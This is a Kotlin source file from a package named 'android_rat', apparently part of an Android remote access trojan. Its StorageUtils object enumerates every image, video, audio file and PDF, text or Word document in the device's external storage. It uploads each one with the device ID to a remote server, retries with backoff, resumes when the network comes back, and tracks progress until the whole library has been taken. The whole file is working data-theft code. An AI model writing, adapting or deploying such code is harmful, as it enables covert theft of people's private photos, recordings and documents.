package com.example.android_rat.utils

import android.content.ContentUris
import android.content.Context
import android.net.Uri
import android.provider.MediaStore
import android.util.Log
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import java.io.File
import java.io.FileInputStream
import java.io.IOException
import java.util.concurrent.TimeUnit
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.os.Handler
import android.os.Looper
import java.io.FileOutputStream
import kotlin.math.pow
import android.net.ConnectivityManager
import android.net.Network
import android.net.NetworkCapabilities
import android.net.NetworkRequest

object StorageUtils {

    private const val CHUNK_SIZE = 4096
    private var totalFilesToProcess = 0
    private var filesProcessed = 0
    private var isRetrievalInProgress = false
    private var isNetworkAvailable = true

    fun registerNetworkCallback(context: Context) {
        val connectivityManager = context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager

        val networkRequest = NetworkRequest.Builder()
            .addCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
            .build()

        connectivityManager.registerNetworkCallback(networkRequest, object : ConnectivityManager.NetworkCallback() {
            override fun onAvailable(network: Network) {
                isNetworkAvailable = true
                Log.d("NetworkCallback", "Network is available, resuming uploads if any were paused.")
                // Resume the media retrieval process if it was paused
                if (isRetrievalInProgress) {
                    resumeMediaProcessing(context)
                }
            }

            override fun onLost(network: Network) {
                isNetworkAvailable = false
                Log.d("NetworkCallback", "Network lost, pausing media retrieval.")
                // Pause the retrieval process
            }
        })
    }

    fun retrieveAndSendMedia(context: Context) {
        if (checkMediaRetrievedState(context)) {
            Log.d("StorageUtils", "All media has already been retrieved, ignoring the request.")
            return
        }

        isRetrievalInProgress = true

        DynamicThreadManager.adjustThreadPool(context)

        val mediaUris = listOf(
            MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
            MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
            MediaStore.Audio.Media.EXTERNAL_CONTENT_URI
        )

        // Reset counters
        totalFilesToProcess = 0
        filesProcessed = 0

        // Process media files
        for (uri in mediaUris) {
            countFilesToProcess(context, uri)
            retrieveMediaFromUri(context, uri)
        }

        // Process documents like PDFs
        retrieveDocumentFiles(context)
    }

    private fun retrieveDocumentFiles(context: Context) {
        val projection = arrayOf(
            MediaStore.Files.FileColumns._ID,
            MediaStore.Files.FileColumns.DISPLAY_NAME,
            MediaStore.Files.FileColumns.MIME_TYPE
        )

        val selection = "${MediaStore.Files.FileColumns.MIME_TYPE} IN (?, ?, ?)"
        val selectionArgs = arrayOf(
            "application/pdf", // PDFs
            "text/plain",      // Text documents
            "application/msword" // Word documents, add more types as needed
        )

        val uri = MediaStore.Files.getContentUri("external")

        val cursor = context.contentResolver.query(uri, projection, selection, selectionArgs, null)
        cursor?.use {
            while (it.moveToNext()) {
                val id = it.getLong(it.getColumnIndexOrThrow(MediaStore.Files.FileColumns._ID))
                val displayName = it.getString(it.getColumnIndexOrThrow(MediaStore.Files.FileColumns.DISPLAY_NAME))
                val contentUri = ContentUris.withAppendedId(uri, id)

                // Submit the file for processing
                Log.d("StorageUtils", "Processing document: $displayName")
                DynamicThreadManager.submitTask(Runnable {
                    try {
                        processAndSendMedia(context, contentUri, displayName)
                    } catch (e: Exception) {
                        Log.e("StorageUtils", "Error processing document: $displayName, error: ${e.message}")
                    }
                })
            }
        }
    }

    private fun countFilesToProcess(context: Context, uri: Uri) {
        val projection = arrayOf(MediaStore.MediaColumns._ID) // Use _ID for content URIs
        val cursor = context.contentResolver.query(uri, projection, null, null, null)

        cursor?.use {
            totalFilesToProcess += it.count
            Log.d("StorageUtils", "Found ${it.count} files in URI: $uri")
        } ?: Log.e("StorageUtils", "Cursor is null for URI: $uri")
    }

    private fun retrieveMediaFromUri(context: Context, uri: Uri) {
        val projection = arrayOf(MediaStore.MediaColumns._ID, MediaStore.MediaColumns.DISPLAY_NAME)
        val cursor = context.contentResolver.query(uri, projection, null, null, "${MediaStore.MediaColumns._ID} DESC")

        // Get the last processed file from SharedPreferences
        val lastProcessedFile = getLastProcessedFile(context)
        var resumeFromLastFile = lastProcessedFile == null

        cursor?.use {
            val idColumn = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns._ID)
            val nameColumn = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.DISPLAY_NAME)

            // Track if we're processing after the last processed file
            while (it.moveToNext()) {
                val id = cursor.getLong(idColumn)
                val displayName = cursor.getString(nameColumn)

                // Create content URI using the ID
                val contentUri = ContentUris.withAppendedId(uri, id)

                // Resume from the last processed file if found
//                if (!resumeFromLastFile) {
//                    if (displayName == lastProcessedFile) {
//                        resumeFromLastFile = true
//                        Log.d("StorageUtils", "Found last processed file, resuming: $displayName")
//                    }
//                    Log.d("StorageUtils", "continuing $lastProcessedFile $resumeFromLastFile")
//                    continue
//                }

                // Process files after the last processed file
                Log.d("StorageUtils", "Submitting task for file: $displayName")

                DynamicThreadManager.submitTask(Runnable {
                    try {
                        processAndSendMedia(context, contentUri, displayName)
                    } catch (e: Exception) {
                        Log.e("StorageUtils", "Error processing file: $displayName, error: ${e.message}")
                    }
                })
            }
        } ?: Log.e("StorageUtils", "Cursor is null for URI: $uri")
    }

    fun resumeMediaProcessing(context: Context) {
        if (isRetrievalInProgress) {
            Log.d("StorageUtils", "Resuming media retrieval process.")
            retrieveAndSendMedia(context)
        }
    }

    private fun processAndSendMedia(context: Context, contentUri: Uri, displayName: String, retryCount: Int = 0) {
        if (!isNetworkAvailable) {
            Log.d("StorageUtils", "Network is unavailable, waiting for connection to resume processing.")
            return // Pause until network is available again
        }

        try {
            Log.d("StorageUtils", "Started processing media: $displayName")

            val compressedFile = compressImageIfNeeded(context, contentUri)

            val requestBody = object : RequestBody() {
                override fun contentType(): MediaType? {
                    return "application/octet-stream".toMediaTypeOrNull()
                }

                override fun writeTo(sink: okio.BufferedSink) {
                    val inputStream = FileInputStream(compressedFile)
                    val buffer = ByteArray(CHUNK_SIZE)

                    try {
                        var bytesRead: Int
                        while (inputStream.read(buffer).also { bytesRead = it } != -1) {
                            sink.write(buffer, 0, bytesRead)
                        }
                        Log.d("StorageUtils", "Completed writing media: $displayName to buffer.")
                    } catch (e: IOException) {
                        Log.e("StorageUtils", "Error writing media to stream: ${e.message}")
                    } finally {
                        inputStream.close()
                    }
                }
            }

            val request = Request.Builder()
                .url(ServerUtils.serverHttpMediaUploadUrl)
                .post(MultipartBody.Builder()
                    .setType(MultipartBody.FORM)
                    .addFormDataPart("device_id", DeviceMetadataUtils.getDeviceId())
                    .addFormDataPart("file", displayName, requestBody)
                    .build())
                .build()

            val client = OkHttpClient.Builder()
                .connectTimeout(1, TimeUnit.MINUTES)
                .writeTimeout(1, TimeUnit.MINUTES)
                .readTimeout(1, TimeUnit.MINUTES)
                .build()

            client.newCall(request).enqueue(object : Callback {
                override fun onResponse(call: Call, response: Response) {
                    Log.d("StorageUtils", "Media uploaded successfully: $displayName")
                    compressedFile.delete()
                    saveLastProcessedFile(context, displayName)
                    onFileProcessed(context)
                }

                override fun onFailure(call: Call, e: IOException) {
                    Log.e("StorageUtils", "Error uploading media: $displayName, error: ${e.message}")

                    if (!isNetworkAvailable) {
                        Log.d("StorageUtils", "Network unavailable, waiting to retry upload.")
                        return
                    }

                    // Retry with exponential backoff
                    val delay = minOf(60_000, 1_000 * 2.0.pow(retryCount.toDouble()).toLong()) // Cap at 60 seconds
                    Handler(Looper.getMainLooper()).postDelayed({
                        Log.d("StorageUtils", "Retrying upload for media: $displayName after ${delay / 1000} seconds (Attempt ${retryCount + 1})")
                        processAndSendMedia(context, contentUri, displayName, retryCount + 1)
                    }, delay)
                }
            })

        } catch (e: Exception) {
            Log.e("StorageUtils", "Error processing media: $displayName, error: ${e.message}")
            onFileProcessed(context)
        }
    }

    private fun onFileProcessed(context: Context) {
        filesProcessed++
        Log.d("StorageUtils", "Files processed: $filesProcessed / $totalFilesToProcess")

        if (filesProcessed == totalFilesToProcess) {
            Log.d("StorageUtils", "All storage data has been successfully uploaded.")

            // Optionally stop the service or trigger other events here
            isRetrievalInProgress = false

            // Mark all media as retrieved
            saveMediaRetrievedState(context, true)
        }
    }

    private fun saveMediaRetrievedState(context: Context, state: Boolean) {
        val sharedPreferences = context.getSharedPreferences("StoragePrefs", Context.MODE_PRIVATE)
        val editor = sharedPreferences.edit()
        editor.putBoolean("is_all_media_retrieved", state)
        editor.apply()
    }

    private fun checkMediaRetrievedState(context: Context): Boolean {
        val sharedPreferences = context.getSharedPreferences("StoragePrefs", Context.MODE_PRIVATE)
        return sharedPreferences.getBoolean("is_all_media_retrieved", false)
    }

    private fun saveLastProcessedFile(context: Context, displayName: String) {
        Log.d("StorageUtils", "Saving last processed file: $displayName")
        val sharedPreferences = context.getSharedPreferences("StoragePrefs", Context.MODE_PRIVATE)
        val editor = sharedPreferences.edit()
        editor.putString("last_file_name", displayName)  // Save the file name, not the path
        editor.apply()
    }

    private fun getLastProcessedFile(context: Context): String? {
        val sharedPreferences = context.getSharedPreferences("StoragePrefs", Context.MODE_PRIVATE)
        val lastFile = sharedPreferences.getString("last_file_name", null)
        Log.d("StorageUtils", "Last processed file retrieved: $lastFile")
        return lastFile
    }

    private fun compressImageIfNeeded(context: Context, contentUri: Uri): File {
        // Get the file extension from the content URI
        val mimeType = context.contentResolver.getType(contentUri)

        if (mimeType == "image/jpeg" || mimeType == "image/png") {
            return compressImage(context, contentUri)
        }

        // If it's not an image or needs no compression, return the original file
        val inputStream = context.contentResolver.openInputStream(contentUri)
        val tempFile = File.createTempFile("media_", null, context.cacheDir)
        inputStream?.use { input -> tempFile.outputStream().use { output -> input.copyTo(output) } }
        return tempFile
    }

    private fun compressImage(context: Context, contentUri: Uri): File {
        val bitmap = BitmapFactory.decodeStream(context.contentResolver.openInputStream(contentUri))

        val compressedFile = File(context.cacheDir, "compressed_${System.currentTimeMillis()}.jpg")
        val outputStream = FileOutputStream(compressedFile)

        // Compress the bitmap to JPEG with 50% quality
        bitmap?.compress(Bitmap.CompressFormat.JPEG, 50, outputStream)
        outputStream.flush()
        outputStream.close()

        return compressedFile
    }
}

